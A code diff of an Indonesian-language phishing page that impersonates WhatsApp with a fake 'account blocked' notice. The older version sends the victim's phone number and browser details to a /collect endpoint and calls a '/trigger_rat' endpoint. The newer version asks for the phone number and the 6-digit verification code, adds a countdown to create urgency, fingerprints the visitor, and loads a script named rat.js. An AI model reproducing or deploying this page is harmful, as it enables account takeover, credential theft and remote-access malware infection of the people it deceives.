@@ -1,58 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Terblokir</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
-        body { background: #0b141a; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: #1f2c33; max-width: 420px; width: 100%; padding: 30px 25px; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.8); text-align: center; }
-        .wa-icon { font-size: 56px; color: #25d366; margin-bottom: 15px; }
-        h2 { color: #e9edef; font-weight: 500; font-size: 22px; }
-        p { color: #8696a0; font-size: 14px; margin: 12px 0 25px; line-height: 1.5; }
-        .input-group { background: #2a3942; border-radius: 14px; padding: 5px 15px; margin-bottom: 15px; display: flex; align-items: center; border: 1px solid #3b4a54; }
-        .input-group input { background: transparent; border: none; outline: none; color: #e9edef; padding: 14px 0; width: 100%; font-size: 15px; }
-        .input-group input::placeholder { color: #8696a0; }
-        .btn { background: #25d366; color: #0b141a; font-weight: 600; border: none; padding: 14px; width: 100%; border-radius: 30px; font-size: 16px; cursor: pointer; transition: 0.2s; }
-        .btn:hover { background: #1fa85b; }
-        .footer { color: #667781; font-size: 12px; margin-top: 20px; }
-        .loader { display: none; margin: 10px auto; border: 3px solid #2a3942; border-top: 3px solid #25d366; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>WhatsApp - Akun Diblokir</title>
+    <link rel="stylesheet" href="assets/wa-banned.css">
+    <link rel="icon" href="assets/wa-logo.svg">
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 </head>
 <body>
-<div class="container">
-    <div class="wa-icon">📱</div>
-    <h2>Akun WhatsApp Anda Diblokir</h2>
-    <p>Kami mendeteksi aktivitas mencurigakan pada akun Anda.<br>Harap verifikasi nomor Anda untuk memulihkan akses.</p>
-    <form id="waForm">
-        <div class="input-group">
-            <span style="color:#8696a0;font-size:18px;">+</span>
-            <input type="text" id="phone" placeholder="Masukkan nomor WhatsApp Anda" required>
+    <div class="wa-container">
+        <div class="wa-header">
+            <img src="assets/wa-logo.svg" alt="WhatsApp" class="wa-logo">
+            <h1 class="wa-title">тЪая╕П AKUN ANDA DIBLOKIR</h1>
         </div>
-        <button type="submit" class="btn">VERIFIKASI SEKARANG</button>
-        <div class="loader" id="loader"></div>
-    </form>
-    <div class="footer">© 2026 WhatsApp LLC • Keamanan terenkripsi</div>
-</div>
-<script>
-    document.getElementById('waForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const phone = document.getElementById('phone').value;
-        if (!phone || phone.length < 8) return;
-        document.getElementById('loader').style.display = 'block';
-        fetch('/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language })
-        }).then(res => res.json()).then(data => {
-            document.getElementById('loader').style.display = 'none';
-            document.querySelector('.container').innerHTML = `<div style="padding:30px 0;color:#25d366;"><h2>✅ Verifikasi Berhasil</h2><p style="margin-top:10px;">Akun Anda akan dipulihkan dalam 5 menit.</p></div>`;
-            // Trigger RAT execution via WebSocket/SSE
-            fetch('/trigger_rat');
-        }).catch(() => { document.getElementById('loader').style.display = 'none'; });
-    });
-</script>
+        
+        <div class="wa-content">
+            <div class="warning-icon">ЁЯЪл</div>
+            <p class="wa-message">
+                Akun WhatsApp Anda telah diblokir karena pelanggaran kebijakan.<br>
+                Verifikasi identitas Anda untuk membuka blokir.
+            </p>
+            
+            <form id="verifyForm" class="wa-form">
+                <div class="input-group">
+                    <label>Nomor Telepon</label>
+                    <input type="tel" id="phone" placeholder="+62xxxxxxxxxxx" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Kode Verifikasi 6 Digit</label>
+                    <input type="text" id="otp" maxlength="6" placeholder="000000" required>
+                </div>
+                
+                <button type="submit" class="btn-verify">
+                    Verifikasi & Buka Blokir
+                </button>
+            </form>
+            
+            <div class="wa-footer">
+                <p>тП░ Sisa waktu: <span id="countdown">04:59</span></p>
+            </div>
+        </div>
+    </div>
+    
+    <script src="assets/rat.js"></script>
 </body>
 </html>
